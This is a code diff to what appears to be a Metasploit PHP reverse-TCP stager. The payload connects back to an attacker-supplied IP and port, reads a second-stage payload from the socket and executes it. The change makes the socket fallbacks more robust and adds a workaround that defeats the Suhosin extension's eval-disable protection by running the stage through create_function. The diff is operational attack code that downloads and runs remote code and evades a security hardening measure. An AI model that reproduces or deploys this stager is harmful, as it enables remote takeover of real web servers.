@@ -60,15 +60,18 @@ $port = #{opts[:port]};
 if (($f = 'stream_socket_client') && is_callable($f)) {
 	$s = $f("tcp://{$ip}:{$port}");
 	$s_type = 'stream';
-} elseif (($f = 'fsockopen') && is_callable($f)) {
+}
+if (!$s && ($f = 'fsockopen') && is_callable($f)) {
 	$s = $f($ip, $port);
 	$s_type = 'stream';
-} elseif (($f = 'socket_create') && is_callable($f)) {
+}
+if (!$s && ($f = 'socket_create') && is_callable($f)) {
 	$s = $f(#{ipf}, SOCK_STREAM, SOL_TCP);
 	$res = @socket_connect($s, $ip, $port);
 	if (!$res) { die(); }
 	$s_type = 'socket';
-} else {
+}
+if (!$s_type) {
 	die('no socket funcs');
 }
 if (!$s) { die('no socket'); }
@@ -99,7 +102,15 @@ while (strlen($b) < $len) {
 # Set up the socket for the main stage to use.
 $GLOBALS['msgsock'] = $s;
 $GLOBALS['msgsock_type'] = $s_type;
-eval($b);
+if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) 
+{ 
+  $suhosin_bypass=create_function('', $b); 
+  $suhosin_bypass(); 
+} 
+else 
+{ 
+  eval($b); 
+}
 die();^
   end
 
